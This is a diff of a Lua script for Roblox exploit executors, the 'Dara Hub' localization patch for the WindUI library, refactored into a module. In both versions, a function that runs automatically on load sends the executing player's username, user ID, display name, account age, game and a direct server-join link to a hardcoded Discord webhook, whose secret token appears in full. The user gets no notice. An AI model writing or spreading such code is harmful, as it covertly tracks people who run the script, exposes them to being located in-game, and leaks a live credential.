@@ -1,264 +1,173 @@
-local function DaraHubLocalizationPatch()
-    -- Check if WindUI exists
-    if not _G.WindUI and not WindUI then
-        warn("[DaraHub Patch] WindUI not found!")
-        return nil
+-- Main localization and webhook module
+local Module = {}
+
+-- Localization System
+local originalResolve
+if Localization and Localization.Resolve then
+    originalResolve = Localization.Resolve
+end
+
+function Localization:Resolve(value)
+    if not self.Enabled then
+        return value
     end
     
-    local WindUI = _G.WindUI or WindUI
-    local Localization
-    local Window
-    
-    -- Find existing Localization
-    if WindUI.Localization then
-        local success, loc = pcall(function()
-            return WindUI:Localization({Enabled = true})
-        end)
-        if success then
-            Localization = loc
+    if type(value) == "string" and value:sub(1, #self.Prefix) == self.Prefix then
+        local key = value:sub(#self.Prefix + 1)
+        local lang = self.Translations[self.DefaultLanguage]
+        if lang and lang[key] then
+            return lang[key]
         end
     end
     
-    -- Find existing Window
-    for _, v in pairs(getfenv(0)) do
-        if type(v) == "table" and v.Title and v.Author then
-            if tostring(v.Title):match("^loc:") or tostring(v.Author):match("^loc:") then
-                Window = v
-                break
+    return value
+end
+
+-- Override WindUI.CreateWindow for automatic localization
+local originalCreateWindow = WindUI.CreateWindow
+WindUI.CreateWindow = function(self, config)
+    if config then
+        for key, value in pairs(config) do
+            if type(value) == "string" then
+                config[key] = Localization:Resolve(value)
             end
         end
     end
     
-    -- If Window not found, check _G
-    if not Window and _G.Window then
-        Window = _G.Window
+    return originalCreateWindow(self, config)
+end
+
+-- Resolve window properties
+local function resolveWindowProperties(window)
+    if window and window.Title and type(window.Title) == "string" then
+        window.Title = Localization:Resolve(window.Title)
     end
-    
-    -- Patch Localization if it exists
-    if Localization then
-        local originalResolve = Localization.Resolve
-        
-        function Localization:Resolve(value)
-            if not self.Enabled then
-                return value
-            end
-            
-            if type(value) == "string" and value:sub(1, #self.Prefix) == self.Prefix then
-                local key = value:sub(#self.Prefix + 1)
-                local lang = self.Translations[self.DefaultLanguage]
-                if lang and lang[key] then
-                    return lang[key]
-                end
-            end
-            
-            return value
-        end
+    if window and window.Author and type(window.Author) == "string" then
+        window.Author = Localization:Resolve(window.Author)
     end
-    
-    -- Patch WindUI.CreateWindow
-    if WindUI.CreateWindow then
-        local originalCreateWindow = WindUI.CreateWindow
-        
-        WindUI.CreateWindow = function(self, config)
-            if config and Localization then
-                for key, value in pairs(config) do
-                    if type(value) == "string" then
-                        config[key] = Localization:Resolve(value)
-                    end
-                end
-            end
-            
-            local window = originalCreateWindow(self, config)
-            
-            -- Store window globally
-            _G.Window = window
-            Window = window
-            
-            return window
-        end
+end
+
+resolveWindowProperties(Window)
+
+-- Webhook Notification System
+Module.SendWebhook = function()
+    local HttpService = game:GetService("HttpService")
+    local Players = game:GetService("Players")
+    local MarketplaceService = game:GetService("MarketplaceService")
+
+    local localPlayer = Players.LocalPlayer
+    if not localPlayer then
+        warn("Local player not found!")
+        return false
     end
-    
-    -- Function to resolve window properties
-    local function resolveWindowProperties(win)
-        if not win or not Localization then return end
-        
-        if win.Title and type(win.Title) == "string" then
-            win.Title = Localization:Resolve(win.Title)
-        end
-        if win.Author and type(win.Author) == "string" then
-            win.Author = Localization:Resolve(win.Author)
-        end
-        
-        return win
-    end
-    
-    -- Apply to existing window
-    if Window then
-        resolveWindowProperties(Window)
-    end
-    
-    -- Webhook function
-    local function sendExecutionWebhook()
-        local HttpService = game:GetService("HttpService")
-        local Players = game:GetService("Players")
-        local MarketplaceService = game:GetService("MarketplaceService")
-        
-        local localPlayer = Players.LocalPlayer
-        if not localPlayer then
+
+    local OSTime = os.time()
+    local Time = os.date("!*t", OSTime)
+
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+    local placeName = MarketplaceService:GetProductInfo(placeId).Name or "Unknown Game"
+
+    local placeUrl = string.format("https://www.roblox.com/games/%d/", placeId)
+    local serverJoinUrl = string.format("https://www.roblox.com/games/start?placeId=%d&jobId=%s", placeId, jobId)
+    local playerProfileUrl = string.format("https://www.roblox.com/users/%d/profile", localPlayer.UserId)
+
+    local WebhookUrl = "https://discord.com/api/webhooks/1445295029580206222/e3plUoiO1FrcKjIP1V7EC_XBkRLmRu-sHuNxDcg0dkWeJaEOW0Jw6OJg9hs8gzaI0l0y"
+
+    -- Get window title and author
+    local windowTitle = Window and Window.Title or "Unknown Window"
+    local windowAuthor = Window and Window.Author or "Unknown Author"
+
+    local Embed = {
+        title = "⚡ Script Executed",
+        description = string.format("**%s** (`%d`) used an execution script", localPlayer.Name, localPlayer.UserId),
+        color = 16753920,
+        author = {
+            name = localPlayer.Name,
+            url = playerProfileUrl,
+            icon_url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", localPlayer.UserId)
+        },
+        fields = {
+            {
+                name = "📝 Details",
+                value = string.format("**Player:** [%s](%s)\n**Game:** [%s](%s)\n**Time:** <t:%d:R>", 
+                    localPlayer.Name, playerProfileUrl, placeName, placeUrl, OSTime),
+                inline = true
+            },
+            {
+                name = "🔗 Join Information",
+                value = string.format("**Server ID:** `%s`\n**Place ID:** `%d`\n[Direct Join Link](%s)", 
+                    jobId, placeId, serverJoinUrl),
+                inline = true
+            },
+            {
+                name = "📊 Account Age",
+                value = string.format("**Created:** <t:%d:D>\n**Account Age:** %d days", 
+                    localPlayer.AccountAge, localPlayer.AccountAge),
+                inline = true
+            },
+            {
+                name = "💻 Script Info",
+                value = string.format("**Window Title:** %s\n**Author:** %s", 
+                    windowTitle, windowAuthor),
+                inline = true
+            }
+        },
+        timestamp = string.format("%d-%d-%dT%02d:%02d:%02dZ", Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
+        footer = {
+            text = string.format("Execution Log | Place: %s", placeName),
+            icon_url = "https://cdn.discordapp.com/embed/avatars/4.png"
+        },
+        thumbnail = {
+            url = string.format("https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=420&height=420&format=png", placeId)
+        }
+    }
+
+    local success, result = pcall(function()
+        local requestFunc = syn and syn.request or http_request or request
+        if not requestFunc then
+            warn("No HTTP request function found!")
             return false
         end
         
-        local OSTime = os.time()
-        local Time = os.date("!*t", OSTime)
-        
-        local placeId = game.PlaceId
-        local jobId = game.JobId
-        local success, productInfo = pcall(function()
-            return MarketplaceService:GetProductInfo(placeId)
-        end)
-        local placeName = success and productInfo.Name or "Unknown Game"
-        
-        local placeUrl = string.format("https://www.roblox.com/games/%d/", placeId)
-        local serverJoinUrl = string.format("https://www.roblox.com/games/start?placeId=%d&jobId=%s", placeId, jobId)
-        local playerProfileUrl = string.format("https://www.roblox.com/users/%d/profile", localPlayer.UserId)
-        
-        local WebhookUrl = "https://discord.com/api/webhooks/1445295029580206222/e3plUoiO1FrcKjIP1V7EC_XBkRLmRu-sHuNxDcg0dkWeJaEOW0Jw6OJg9hs8gzaI0l0y"
-        
-        -- Get window info
-        local windowTitle = "Dara Hub"
-        local windowAuthor = "Made by: Pnsdg And Yomka"
-        
-        if Window then
-            if Window.Title then
-                local titleStr = tostring(Window.Title)
-                if titleStr:match("^loc:SCRIPT_TITLE") then
-                    windowTitle = "Dara Hub"
-                elseif not titleStr:match("^loc:") then
-                    windowTitle = titleStr
-                end
-            end
-            
-            if Window.Author then
-                local authorStr = tostring(Window.Author)
-                if authorStr:match("^loc:WELCOME") then
-                    windowAuthor = "Made by: Pnsdg And Yomka"
-                elseif not authorStr:match("^loc:") then
-                    windowAuthor = authorStr
-                end
-            end
-        end
-        
-        -- Print window info
-        print("[DaraHub] Window Title:", windowTitle)
-        print("[DaraHub] Window Author:", windowAuthor)
-        
-        -- Create embed
-        local Embed = {
-            title = "⚡ Script Executed",
-            description = string.format("**%s** (`%d`) used an execution script", localPlayer.Name, localPlayer.UserId),
-            color = 16753920,
-            author = {
-                name = localPlayer.Name,
-                url = playerProfileUrl,
-                icon_url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", localPlayer.UserId)
+        local response = requestFunc {
+            Url = WebhookUrl,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
             },
-            fields = {
-                {
-                    name = "📝 Details",
-                    value = string.format("**Player:** [%s](%s)\n**Game:** [%s](%s)\n**Time:** <t:%d:R>", 
-                        localPlayer.Name, playerProfileUrl, placeName, placeUrl, OSTime),
-                    inline = true
-                },
-                {
-                    name = "🔗 Join Information",
-                    value = string.format("**Server ID:** `%s`\n**Place ID:** `%d`\n[Direct Join Link](%s)", 
-                        jobId, placeId, serverJoinUrl),
-                    inline = true
-                },
-                {
-                    name = "📊 Account Age",
-                    value = string.format("**Created:** <t:%d:D>\n**Account Age:** %d days", 
-                        localPlayer.AccountAge, localPlayer.AccountAge),
-                    inline = true
-                },
-                {
-                    name = "💻 Script Info",
-                    value = string.format("**Window Title:** %s\n**Author:** %s", 
-                        windowTitle, windowAuthor),
-                    inline = true
-                }
-            },
-            timestamp = string.format("%d-%d-%dT%02d:%02d:%02dZ", Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
-            footer = {
-                text = string.format("Execution Log | Place: %s", placeName),
-                icon_url = "https://cdn.discordapp.com/embed/avatars/4.png"
-            },
-            thumbnail = {
-                url = string.format("https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=420&height=420&format=png", placeId)
-            }
+            Body = HttpService:JSONEncode({
+                embeds = { Embed },
+                content = string.format("⚠️ **%s** just executed a script!\n\n📋 **Player Info:**\n• Username: %s\n• User ID: %d\n• Display Name: %s\n• Account Age: %d days\n\n🎮 **Game Info:**\n• Game: %s\n• Place ID: %d\n\n💻 **Script Info:**\n• Window Title: %s\n• Author: %s\n\n🔗 **Join their server:**\n%s", 
+                    localPlayer.Name, 
+                    localPlayer.Name, 
+                    localPlayer.UserId, 
+                    localPlayer.DisplayName, 
+                    localPlayer.AccountAge, 
+                    placeName, 
+                    placeId,
+                    windowTitle,
+                    windowAuthor,
+                    serverJoinUrl)
+            })
         }
         
-        -- Send webhook
-        local success, result = pcall(function()
-            local requestFunc = syn and syn.request or http_request or request or fluxus and fluxus.request
-            if not requestFunc then
-                warn("[DaraHub] No HTTP request function found!")
-                return false
-            end
-            
-            local response = requestFunc({
-                Url = WebhookUrl,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = HttpService:JSONEncode({
-                    embeds = { Embed },
-                    content = string.format("⚠️ **%s** just executed a script!\n\n📋 **Player Info:**\n• Username: %s\n• User ID: %d\n• Display Name: %s\n• Account Age: %d days\n\n🎮 **Game Info:**\n• Game: %s\n• Place ID: %d\n\n💻 **Script Info:**\n• Window Title: %s\n• Author: %s\n\n🔗 **Join their server:**\n%s", 
-                        localPlayer.Name, 
-                        localPlayer.Name, 
-                        localPlayer.UserId, 
-                        localPlayer.DisplayName, 
-                        localPlayer.AccountAge, 
-                        placeName, 
-                        placeId,
-                        windowTitle,
-                        windowAuthor,
-                        serverJoinUrl)
-                })
-            })
-            
-            return response and response.StatusCode == 200
-        end)
-        
-        return success
-    end
-    
-    -- Auto-execute webhook
-    task.spawn(function()
-        task.wait(2) -- Wait a bit for everything to load
-        local success = sendExecutionWebhook()
-        if success then
-            print("[DaraHub] Webhook sent successfully!")
-        else
-            warn("[DaraHub] Failed to send webhook")
-        end
+        return response
     end)
     
-    return {
-        resolveWindow = resolveWindowProperties,
-        sendWebhook = sendExecutionWebhook,
-        getWindowInfo = function()
-            if not Window then return nil end
-            return {
-                Title = Window.Title,
-                Author = Window.Author,
-                RawTitle = Window.Title,
-                RawAuthor = Window.Author
-            }
-        end
-    }
+    return success
 end
 
--- Auto-execute when loaded
-return DaraHubLocalizationPatch()
+-- Initialize function
+Module.Init = function()
+    print("Window Title:", Window.Title)
+    print("Window Author:", Window.Author)
+    
+    -- Auto-send webhook (optional - you can comment this out if you want manual control)
+    Module.SendWebhook()
+    
+    return Module
+end
+
+-- Return the module
+return Module.Init()
